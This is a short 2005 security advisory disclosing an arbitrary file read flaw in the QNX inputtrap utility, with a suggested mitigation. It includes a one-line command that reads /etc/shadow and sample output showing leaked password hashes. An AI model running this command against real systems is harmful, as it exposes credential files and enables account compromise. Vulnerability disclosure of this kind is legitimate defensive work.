Title: QNX inputtrap arbitrary file read vulnerability [RLSA_01-2005]
Versions: QNX RTOS 6.3, 6.1.0 (possibly others)
Vendor: http://www.qnx.com
Date: Feb 22 2005

1. Introduction
   
   inputtrap is a utility designed to detect and start input manager in QNX.

2. Details

   inputtrap has a '-t' flag to specify the trap file to be read. Due to impro-
per permissions checking, we have administrative access to read files anywhere
in the disk in addition with 'start' flag.

The following simple command will show us /etc/shadow: 

$ inputtrap -t /etc/shadow start
options: Unable to lookup root:21QjUKxP9gEJK:0:0:0 in modules table
options: Unable to lookup sandimas:91UzHxvt3x1n2:0:0:0 in modules table

PS: This "design error" problem is similar to an old Debian 1.1 DOSEmu vulnera-
    bility, back in 1999. And it was, surely, erradicated in crucial programs
    of most operating systems.

3. Solution

   No official solution yet. We suggest remove inputtrap suid bit or change its
permissions to a trusted group of users until QNX doesn't release an official
patch.
